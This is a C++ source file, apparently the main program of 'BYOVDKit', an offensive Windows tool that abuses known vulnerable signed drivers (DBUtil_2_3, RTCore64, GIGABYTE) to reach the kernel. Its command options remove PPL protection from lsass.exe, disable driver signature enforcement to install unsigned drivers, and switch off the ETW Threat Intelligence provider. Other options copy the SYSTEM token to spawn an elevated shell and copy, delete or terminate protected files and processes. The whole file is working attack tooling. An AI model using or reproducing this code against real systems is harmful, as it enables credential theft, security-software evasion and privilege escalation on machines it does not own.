#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <tlhelp32.h>


#include "FindOffset.h"
#include "DriverOps.h"
#include "DisablePPL.h"
#include "TokenCopy.h"
#include "HandleElevate.h"
#include "DisableDSE.h"
#include "DisableEtwTi.h"


int processPIDByName(const WCHAR* name) {
    int pid = 0;

    // Create a snapshot of currently running processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot error: 0x%08x\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process and exit if unsuccessful
    if (!Process32First(snap, &pe32)) {
        printf("Process32First error: 0x%08x\n", GetLastError());
        CloseHandle(snap);
    }

    do {
        if (wcscmp(pe32.szExeFile, name) == 0) {
            pid = pe32.th32ProcessID;
        }

    } while (Process32Next(snap, &pe32));

    // Clean the snapshot object to prevent resource leakage
    CloseHandle(snap);
    return pid;

}


void printHelp() {
    printf(
        "BYOVDKit\n"
        "More info: https://github.com/Hagrid29/BYOVDKit/\n"
    );
    printf(
        ".\\BYOVDKit.exe <driver option> <argument>\n"
            "\t<driver option> - 0: Undefined, 1: DBUtil_2_3, 2: RTCore64, 3: GIGABYTE. Default DBUtil_2_3\n"
        "Options:\n"
        "Install Driver: installDrv <driver path> [service name]\n"
        "Uninstall Driver: uninstallDrv <service name>\n"
        "PPL options: PPL <check/disable> [PID]\n"
            "\t[PID] - default check or disable LSA protection\n"
        "PPL options: PPL enable <PID> [<PP/PPL> <signer type>]\n"
            "\t[PP/PPL] - default PPL\n"
            "\t[signer type] - default WinTcb\n"
        "DSE options: DSE <check/enable/disable/installUnsignDrv>\n"
        "DSE options: DSE installUnsignDrv <driver path> <service name>\n"
            "\tinstallUnsignDrv - Install Unsigned Driver and revert DSE setting\n"
        "Copy protected file: copy <file path>\n"
        "Delete protected file: delete <file path>\n"
        "Terminate protected process: kill <PID>\n"
        "Copy Token: token <source PID> [target PID]\n"
            "\t[source PID] - input 4 to copy SYSTEM token\n"
            "\t[target PID] - default spawn cmd\n"
        "EtwTi options: ETW <enable/disable/check>\n"
    );
    return;
}


int wmain(int argc, wchar_t* argv[])
{

    if (argc < 3) {
        printHelp();
        return 0;
    }
    DRIVER_OPTION dvr_opt;
    switch (wcstoul(argv[1], nullptr, 10)) {
        case 0:
            dvr_opt = undefined;
            printf("Using undefined driver\n");
            break;
        case 1:
            dvr_opt = DBUtil_2_3;
            printf("Using driver DBUtil_2_3\n");
            break;
        case 2:
            dvr_opt = RTCore64;
            printf("Using driver RTCore64\n");
            break;
        case 3:
            dvr_opt = GIO;
            printf("Using driver GIO\n");
            break;
        default:
            dvr_opt = DBUtil_2_3;
            printf("Using driver DBUtil_2_3\n");
            break;
    }

    if (wcscmp(argv[2], L"installDrv") == 0) {
        PCWSTR binPath = argv[3];
        if (argc == 5) {
            if (!ServiceInstall(dvr_opt, binPath, argv[4])) {
                ServiceUninstall(dvr_opt, argv[4]);
            }
        }
        else {
            if (!ServiceInstall(dvr_opt, binPath)) {
                ServiceUninstall(dvr_opt);
            }
        }
        return 0;
    }
    if (wcscmp(argv[2], L"uninstallDrv") == 0) {
        if (argc == 4) {
            ServiceUninstall(dvr_opt, argv[3]);
        }
        else {
            ServiceUninstall(dvr_opt);
        }
        return 0;
    }


    InitOffsets();
    if (!InitDriver(dvr_opt)) {
        printf("Unable to obtain a handle to the device object: 0x%08x\n", GetLastError());
        return 0;
    }


    if (wcscmp(argv[2], L"PPL") == 0) {
        DWORD dwPid = processPIDByName(L"lsass.exe");
        if (argc > 4) {
            dwPid = wcstoul(argv[4], nullptr, 10);
        }
        if (wcscmp(argv[3], L"check") == 0) {
                GetProcessProtection(dwPid);
        }
        else if (wcscmp(argv[3], L"enable") == 0) {
            if (argc < 5) {
                printHelp();
                return 0;
            }
            if(argc == 7)
                SetProcessProtection(dwPid, argv[5], argv[6]);
            else 
                SetProcessProtection(dwPid, L"PPL", L"WinTcb");
        }
        else if (wcscmp(argv[3], L"disable") == 0) {
                UnprotectProcess(dwPid);
        }
    }
    if (wcscmp(argv[2], L"DSE") == 0) {
        if (wcscmp(argv[3], L"check") == 0) {
            GetDSE();
        }
        else if (wcscmp(argv[3], L"enable") == 0) {
            DSE_MODE mode = Enable;
            SetDSE(mode);
        }
        else if (wcscmp(argv[3], L"disable") == 0) {
            DSE_MODE mode = Disable;
            SetDSE(mode);
        }
        else if (wcscmp(argv[3], L"installUnsignDrv") == 0) {
            if (argc < 6) {
                printHelp();
                return 0;
            }
            DSE_MODE oriMode = GetDSE();
            if (oriMode == Error)
                return 0;
            DSE_MODE mode = Disable;
            SetDSE(mode);
            ServiceInstall(dvr_opt, argv[4], argv[5]);
            SetDSE(oriMode);
        }
    }
    if (wcscmp(argv[2], L"copy") == 0) {
        CopyProtectedFile(argv[3]);
    }
    if (wcscmp(argv[2], L"delete") == 0) {
        DeleteProtectedFile(argv[3]);

    }
    if (wcscmp(argv[2], L"kill") == 0) {
        TerminateProtectedProcess(wcstoul(argv[3], nullptr, 10));
    }
    if (wcscmp(argv[2], L"token") == 0) {
        DWORD dwSrcPid = wcstoul(argv[3], nullptr, 10);
        DWORD dwDstPid = GetCurrentProcessId();
        if (argc == 5) {
            dwDstPid = wcstoul(argv[4], nullptr, 10);
        }
        CopyToken(dwSrcPid, dwDstPid);
        if (argc < 5) {
            STARTUPINFOW StartupInfo{};
            StartupInfo.cb = sizeof(StartupInfo);
            PROCESS_INFORMATION ProcessInformation;

            CreateProcessW(LR"(C:\Windows\System32\cmd.exe)",
                nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr,
                &StartupInfo,
                &ProcessInformation);
            WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
            CloseHandle(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hProcess);
        }
    }
    if (wcscmp(argv[2], L"ETW") == 0) {
        if (wcscmp(argv[3], L"enable") == 0)
            SetEtwTi(true);
        else if (wcscmp(argv[3], L"disable") == 0)
            SetEtwTi(false);
        else if(wcscmp(argv[3], L"check") == 0)
            ReadEtwTi();
    }


    CloseDriverHandle();

    return 0;
}
